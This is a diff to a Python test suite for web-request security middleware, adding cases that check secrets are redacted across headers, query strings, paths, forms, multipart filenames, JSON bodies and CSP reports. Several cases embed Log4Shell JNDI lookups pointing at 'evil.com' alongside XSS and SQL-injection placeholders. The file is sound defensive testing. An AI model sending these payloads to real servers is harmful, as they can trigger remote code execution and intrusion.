@@ -314,6 +314,26 @@ def _multipart_body_request(name: str, value: str) -> SyncMockGuardRequest:
     )
 
 
+def _file_field_body(name: str, filename: str) -> bytes:
+    return (
+        f'--B0\r\nContent-Disposition: form-data; name="{name}"; '
+        f'filename="{filename}"\r\n\r\nbinary-content\r\n--B0--\r\n'
+    ).encode()
+
+
+def _multipart_filename_body_request(name: str, filename: str) -> SyncMockGuardRequest:
+    body = _file_field_body(name, filename)
+    return SyncMockGuardRequest(
+        method="POST",
+        client_host="127.0.0.1",
+        body_content=body,
+        headers={
+            "content-type": _CONTENT_TYPE_MULTIPART,
+            "content-length": str(len(body)),
+        },
+    )
+
+
 def _nested_wrapper_body(depth: int, wrapper_key: str, leaf: dict[str, str]) -> bytes:
     leaf_json = json.dumps(leaf)
     prefix = f'{{"{wrapper_key}":' * depth
@@ -359,8 +379,91 @@ def _pct_encoded_name_pair(secret: str) -> str:
     return f"{encoded_name}={secret} {_XSS}"
 
 
+def _comma_pair(secret: str) -> str:
+    return f"a=1,token={secret} {_XSS}"
+
+
+def _pct_space_before_equals_name_pair(secret: str) -> str:
+    return f"token%20={secret} {_XSS}"
+
+
 def _encoded_query_path_request(query_string: str) -> SyncMockGuardRequest:
     return _path_request(f"/resource?{query_string}")
+
+
+def _oversized_json_pair_value(secret: str) -> str:
+    padding = "a" * 20000
+    body = json.dumps({"padding": padding, "password": f"{secret} {_XSS}"})
+    return f"x={body}"
+
+
+def _form_field_oversized_json_request(secret: str) -> SyncMockGuardRequest:
+    return _form_body_request({"data": _oversized_json_pair_value(secret)})
+
+
+def _header_oversized_json_request(secret: str) -> SyncMockGuardRequest:
+    return _header_request("X-Info", _oversized_json_pair_value(secret))
+
+
+class _BoundedBodyRequest(SyncMockGuardRequest):
+    def read_body_prefix(self, max_bytes: int) -> bytes:
+        return (self._body or b"")[:max_bytes]
+
+
+def _read_cap_straddled_json_body_request(secret: str) -> SyncMockGuardRequest:
+    cap = _CONFIG.detection_max_body_inspect_bytes
+    prefix = f'{{"padding":"{_XSS} '
+    key = '","password":"'
+    visible_before_cut = 20
+    padding_len = cap - len(prefix) - len(key) - visible_before_cut
+    tail = f'{secret}"}}'
+    body_text = prefix + ("a" * padding_len) + key + tail
+    body = body_text.encode()
+    return _BoundedBodyRequest(
+        method="POST",
+        client_host="127.0.0.1",
+        body_content=body,
+        headers={
+            "content-type": "application/json",
+            "content-length": str(len(body)),
+        },
+    )
+
+
+def _header_quoted_name_xss_request(secret: str) -> SyncMockGuardRequest:
+    return _header_request("X-Info", f'"password":"{secret}" {_XSS}')
+
+
+def _query_param_name_encoded_five_times_pair(secret: str) -> str:
+    encoded_name = "token"
+    for _ in range(5):
+        encoded_name = quote_plus(encoded_name)
+    return f"{encoded_name}={secret} {_XSS}"
+
+
+def _query_string_header_set_name_pair(secret: str) -> str:
+    return f"authorization={secret} {_XSS}"
+
+
+def _fragment_header_set_name_request(secret: str) -> SyncMockGuardRequest:
+    return _path_request(f"/route#authorization={secret} {_XSS}")
+
+
+def _path_segment_header_set_name_request(secret: str) -> SyncMockGuardRequest:
+    return _path_request(f"/authorization={secret} {_XSS}")
+
+
+def _header_value_header_set_name_request(secret: str) -> SyncMockGuardRequest:
+    return _header_request("X-Session", f"authorization={secret} {_XSS}")
+
+
+def _path_segment_bare_pair_plain_request(secret: str) -> SyncMockGuardRequest:
+    return _path_request(f"/password={secret} {_XSS}")
+
+
+def _path_segment_bare_pair_pct_encoded_request(secret: str) -> SyncMockGuardRequest:
+    pair = quote(f"password={secret} {_XSS}", safe="")
+    return _path_request(f"/{pair}")
 
 
 @dataclass(frozen=True)
@@ -544,6 +647,170 @@ _CASES: list[Case] = [
         "size_json_body_300_level_nested_wrapper_must_not_raise",
         lambda secret: _json_body_request(
             _nested_wrapper_body(300, "wrapper", {"password": f"{secret} {_SQLI}"})
+        ),
+    ),
+    Case(
+        "header_non_sensitive_name_comma_separated_pair_value",
+        lambda secret: _header_request("X-Session", f"a=1,password={secret} {_XSS}"),
+    ),
+    Case(
+        "query_param_non_sensitive_name_comma_separated_pair_value",
+        lambda secret: _query_request("data", f"a=1,password={secret} {_XSS}"),
+    ),
+    Case(
+        "form_body_non_sensitive_field_name_comma_separated_pair_value",
+        lambda secret: _form_body_request({"note": f"a=1,password={secret} {_SQLI}"}),
+    ),
+    Case(
+        "multipart_text_part_non_sensitive_field_name_comma_separated_pair_value",
+        lambda secret: _multipart_body_request(
+            "note", f"a=1,password={secret} {_SQLI}"
+        ),
+    ),
+    Case(
+        "json_body_non_sensitive_key_comma_separated_pair_in_string_value",
+        lambda secret: _json_body_request(
+            json.dumps({"note": f"a=1,password={secret} {_SQLI}"}).encode()
+        ),
+    ),
+    Case(
+        "url_encoding_comma_pair_separator",
+        lambda secret: _encoded_query_path_request(_comma_pair(secret)),
+    ),
+    Case(
+        "header_non_sensitive_name_space_before_equals_pair_value",
+        lambda secret: _header_request("X-Session", f"password ={secret} {_XSS}"),
+    ),
+    Case(
+        "query_param_non_sensitive_name_space_before_equals_pair_value",
+        lambda secret: _query_request("data", f"password ={secret} {_XSS}"),
+    ),
+    Case(
+        "form_body_non_sensitive_field_name_space_before_equals_pair_value",
+        lambda secret: _form_body_request({"note": f"password ={secret} {_SQLI}"}),
+    ),
+    Case(
+        "url_encoding_percent_encoded_space_before_equals_in_name",
+        lambda secret: _encoded_query_path_request(
+            _pct_space_before_equals_name_pair(secret)
+        ),
+    ),
+    Case(
+        "header_non_sensitive_name_space_both_sides_equals_pair_value",
+        lambda secret: _header_request("X-Session", f"password = {secret} {_XSS}"),
+    ),
+    Case(
+        "json_body_depth_capped_non_sensitive_leaf_plain_pair_in_string_value",
+        lambda secret: _json_body_request(
+            _nested_wrapper_body(
+                _json_depth_cap_value(),
+                "wrapper",
+                {"note": f"password={secret} {_SQLI}"},
+            )
+        ),
+    ),
+    Case(
+        "header_non_sensitive_name_json_non_sensitive_key_plain_pair_in_string_value",
+        lambda secret: _header_request(
+            "X-Info", json.dumps({"note": f"password={secret} {_XSS}"})
+        ),
+    ),
+    Case(
+        "query_param_non_sensitive_name_json_non_sensitive_key_plain_pair_in_string_value",
+        lambda secret: _query_request(
+            "data", json.dumps({"note": f"password={secret} {_SQLI}"})
+        ),
+    ),
+    Case(
+        "user_agent_log4shell_with_plain_pair",
+        lambda secret: _header_request(
+            "User-Agent", f"password={secret} ${{jndi:ldap://evil.com/a}}"
+        ),
+    ),
+    Case(
+        "referer_log4shell_with_plain_pair",
+        lambda secret: _header_request(
+            "Referer", f"password={secret} ${{jndi:ldap://evil.com/a}}"
+        ),
+    ),
+    Case(
+        "multipart_filename_plain_pair_value",
+        lambda secret: _multipart_filename_body_request(
+            "upload", f"password={secret} {_XSS}"
+        ),
+    ),
+    Case(
+        "header_non_sensitive_name_nested_pair_value",
+        lambda secret: _header_request("X-Session", f"data=password={secret} {_XSS}"),
+    ),
+    Case(
+        "query_param_non_sensitive_name_nested_pair_value",
+        lambda secret: _query_request("q", f"data=password={secret} {_XSS}"),
+    ),
+    Case(
+        "form_field_oversized_json_sensitive_key_past_16kb_cutoff",
+        _form_field_oversized_json_request,
+    ),
+    Case(
+        "header_oversized_json_sensitive_key_past_16kb_cutoff",
+        _header_oversized_json_request,
+    ),
+    Case(
+        "json_body_cut_at_read_cap_sensitive_key_near_cut",
+        _read_cap_straddled_json_body_request,
+    ),
+    Case(
+        "header_quoted_name_value_with_trailing_xss",
+        _header_quoted_name_xss_request,
+    ),
+    Case(
+        "query_param_sensitive_name_encoded_five_times",
+        lambda secret: _encoded_query_path_request(
+            _query_param_name_encoded_five_times_pair(secret)
+        ),
+    ),
+    Case(
+        "url_query_string_header_set_name_as_pair_name",
+        lambda secret: _encoded_query_path_request(
+            _query_string_header_set_name_pair(secret)
+        ),
+    ),
+    Case(
+        "url_fragment_header_set_name_as_pair_name",
+        _fragment_header_set_name_request,
+    ),
+    Case(
+        "url_path_segment_header_set_name_as_pair_name",
+        _path_segment_header_set_name_request,
+    ),
+    Case(
+        "header_value_header_set_name_as_pair_name",
+        _header_value_header_set_name_request,
+    ),
+    Case(
+        "url_path_segment_bare_pair_plain",
+        _path_segment_bare_pair_plain_request,
+    ),
+    Case(
+        "url_path_segment_bare_pair_percent_encoded",
+        _path_segment_bare_pair_pct_encoded_request,
+    ),
+    Case(
+        "url_query_string_doubled_triple_encoded_equals_assign_run",
+        lambda secret: _encoded_query_path_request(
+            f"x%25253D1;PASSWORD%25253D%25253D '{secret} {_XSS}';y%25253D2"
+        ),
+    ),
+    Case(
+        "matrix_param_colon_space_assign_inside_json_leaf_string",
+        lambda secret: _path_request(
+            f'/resource;{{"note": "x=1%2CAcCeSs_tOkEn: \\"{secret} {_XSS}\\"%2Cy=2"}}'
+        ),
+    ),
+    Case(
+        "header_tab_before_triple_encoded_equals_assign_run",
+        lambda secret: _header_request(
+            "X-Session", f"X-CuStOm-sEcReT-HeAdEr\t%25253D'{secret} {_XSS}'"
         ),
     ),
 ]
@@ -743,6 +1010,21 @@ class _SnapshotPersistTarget(DynamicRuleSnapshotMixin):
         )
 
 
+def _tri_surface_request(secret: str, client_ip: str) -> SyncMockGuardRequest:
+    body = json.dumps({_CUSTOM_SENSITIVE_BODY_FIELD: secret}).encode()
+    return SyncMockGuardRequest(
+        method="POST",
+        client_host=client_ip,
+        query_params={_CUSTOM_SENSITIVE_PARAM: secret},
+        body_content=body,
+        headers={
+            _CUSTOM_SENSITIVE_HEADER: secret,
+            "content-type": "application/json",
+            "content-length": str(len(body)),
+        },
+    )
+
+
 def _run_blacklist_hit(secret: str, ctx: "_ScenarioContext") -> None:
     client_ip = _client_ip_for("blacklist_hit")
     geo_ip_handler = MagicMock()
@@ -788,9 +1070,7 @@ def _run_banned_ip(secret: str, ctx: "_ScenarioContext") -> None:
     config = _scenario_config()
     middleware = _scenario_middleware(config)
     ip_ban_manager.ban_ip(client_ip, 300, "test_ban")
-    request = SyncMockGuardRequest(
-        headers={"Authorization": secret}, client_host=client_ip
-    )
+    request = _tri_surface_request(secret, client_ip)
     pipeline = build_default_pipeline(middleware)
     response = pipeline.execute(request)
     assert response is not None, "banned_ip scenario never blocked"
@@ -819,9 +1099,7 @@ def _run_rate_limit_exceeded(secret: str, ctx: "_ScenarioContext") -> None:
     pipeline = build_default_pipeline(middleware)
 
     def _request() -> SyncMockGuardRequest:
-        return SyncMockGuardRequest(
-            headers={"Authorization": secret}, client_host=client_ip
-        )
+        return _tri_surface_request(secret, client_ip)
 
     first = pipeline.execute(_request())
     assert first is None, (
@@ -960,6 +1238,23 @@ def _run_header_dump_pair_value(secret: str, ctx: "_ScenarioContext") -> None:
     assert response is not None, "header_dump_pair_value scenario never blocked"
 
 
+def _run_custom_excluded_header_log4shell_with_pair(
+    secret: str, ctx: "_ScenarioContext"
+) -> None:
+    client_ip = _client_ip_for("custom_excluded_header_log4shell_with_pair")
+    config = _scenario_config(excluded_detection_headers={"x-custom-excluded"})
+    middleware = _scenario_middleware(config)
+    value = f"password={secret} ${{jndi:ldap://evil.com/a}}"
+    request = SyncMockGuardRequest(
+        headers={"X-Custom-Excluded": value}, client_host=client_ip
+    )
+    pipeline = build_default_pipeline(middleware)
+    response = pipeline.execute(request)
+    assert response is not None, (
+        "custom_excluded_header_log4shell_with_pair scenario never blocked"
+    )
+
+
 def _run_custom_validator_echo(secret: str, ctx: "_ScenarioContext") -> None:
     client_ip = _client_ip_for("custom_validator_echo")
 
@@ -990,9 +1285,7 @@ def _run_time_window_closed(secret: str, ctx: "_ScenarioContext") -> None:
     }
     config = _scenario_config()
     middleware = _scenario_middleware(config, route_config=route_config)
-    request = SyncMockGuardRequest(
-        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
-    )
+    request = _tri_surface_request(secret, client_ip)
     pipeline = build_default_pipeline(middleware)
     time_window_check = next(
         c for c in pipeline.checks if c.check_name == "time_window"
@@ -1008,12 +1301,59 @@ def _run_emergency_mode_denied(secret: str, ctx: "_ScenarioContext") -> None:
     client_ip = _client_ip_for("emergency_mode_denied")
     config = _scenario_config(emergency_mode=True, emergency_whitelist=[])
     middleware = _scenario_middleware(config)
-    request = SyncMockGuardRequest(
-        headers={_CUSTOM_SENSITIVE_HEADER: secret}, client_host=client_ip
-    )
+    request = _tri_surface_request(secret, client_ip)
     pipeline = build_default_pipeline(middleware)
     response = pipeline.execute(request)
     assert response is not None, "emergency_mode_denied scenario never blocked"
+
+
+def _run_cloud_blocked(secret: str, ctx: "_ScenarioContext") -> None:
+    client_ip = _client_ip_for("cloud_blocked")
+    config = _scenario_config(block_cloud_providers=frozenset({"AWS"}))
+    middleware = _scenario_middleware(config)
+    request = _tri_surface_request(secret, client_ip)
+    pipeline = build_default_pipeline(middleware)
+    with (
+        patch(
+            "guard_core.sync.handlers.cloud_handler.cloud_handler.is_cloud_ip",
+            return_value=True,
+        ),
+        patch(
+            "guard_core.sync.handlers.cloud_handler.cloud_handler."
+            "get_cloud_provider_details",
+            return_value=("AWS", "1.2.3.0/24"),
+        ),
+    ):
+        response = pipeline.execute(request)
+    assert response is not None, "cloud_blocked scenario never blocked"
+
+
+def _run_country_blocked(secret: str, ctx: "_ScenarioContext") -> None:
+    client_ip = _client_ip_for("country_blocked")
+    geo_ip_handler = MagicMock()
+    geo_ip_handler.get_country = MagicMock(return_value="XX")
+    config = _scenario_config(
+        blocked_countries=frozenset({"XX"}), geo_ip_handler=geo_ip_handler
+    )
+    middleware = _scenario_middleware(config, geo_ip_handler=geo_ip_handler)
+    request = _tri_surface_request(secret, client_ip)
+    pipeline = build_default_pipeline(middleware)
+    response = pipeline.execute(request)
+    assert response is not None, "country_blocked scenario never blocked"
+
+
+def _run_request_logged(secret: str, ctx: "_ScenarioContext") -> None:
+    client_ip = _client_ip_for("request_logged")
+    config = _scenario_config(log_request_level="INFO")
+    middleware = _scenario_middleware(config)
+    request = _tri_surface_request(secret, client_ip)
+    pipeline = build_default_pipeline(middleware)
+    records_before = len(ctx.caplog.records)
+    response = pipeline.execute(request)
+    assert response is None, "request_logged scenario unexpectedly blocked"
+    assert len(ctx.caplog.records) > records_before, (
+        "request_logged scenario never logged the per-request log line"
+    )
 
 
 def _run_emergency_mode_whitelisted(secret: str, ctx: "_ScenarioContext") -> None:
@@ -1365,8 +1705,16 @@ def _run_security_headers_csp_report(secret: str, ctx: "_ScenarioContext") -> No
             {
                 "csp-report": {
                     "document-uri": f"https://example.com/report?token={secret}",
-                    "violated-directive": "script-src",
+                    "violated-directive": f"script-src token={secret}",
                     "blocked-uri": f"https://evil.example/x?token={secret}",
+                    "source-file": f"https://cdn.example/app.js?token={secret}",
+                    "line-number": f"token={secret}",
+                    "column-number": f"token={secret}",
+                    "original-policy": f"default-src 'self'; token={secret}",
+                    "referrer": f"https://example.com/?token={secret}",
+                    "status-code": f"token={secret}",
+                    "script-sample": f"token={secret}",
+                    "disposition": f"token={secret}",
                 }
             }
         )
@@ -1430,6 +1778,9 @@ _COMPONENT_SCENARIOS: list[ComponentScenario] = [
     ComponentScenario("banned_ip", _run_banned_ip),
     ComponentScenario("route_ip_restricted", _run_route_ip_restricted),
     ComponentScenario("rate_limit_exceeded", _run_rate_limit_exceeded),
+    ComponentScenario("cloud_blocked", _run_cloud_blocked),
+    ComponentScenario("country_blocked", _run_country_blocked),
+    ComponentScenario("request_logged", _run_request_logged),
     ComponentScenario("user_agent_block", _run_user_agent_block),
     ComponentScenario(
         "user_agent_block_pair_after_space", _run_user_agent_block_pair_after_space
@@ -1443,6 +1794,10 @@ _COMPONENT_SCENARIOS: list[ComponentScenario] = [
         "referrer_invalid_query_token", _run_referrer_invalid_query_token
     ),
     ComponentScenario("header_dump_pair_value", _run_header_dump_pair_value),
+    ComponentScenario(
+        "custom_excluded_header_log4shell_with_pair",
+        _run_custom_excluded_header_log4shell_with_pair,
+    ),
     ComponentScenario("custom_validator_echo", _run_custom_validator_echo),
     ComponentScenario("time_window_closed", _run_time_window_closed),
     ComponentScenario("emergency_mode_denied", _run_emergency_mode_denied),
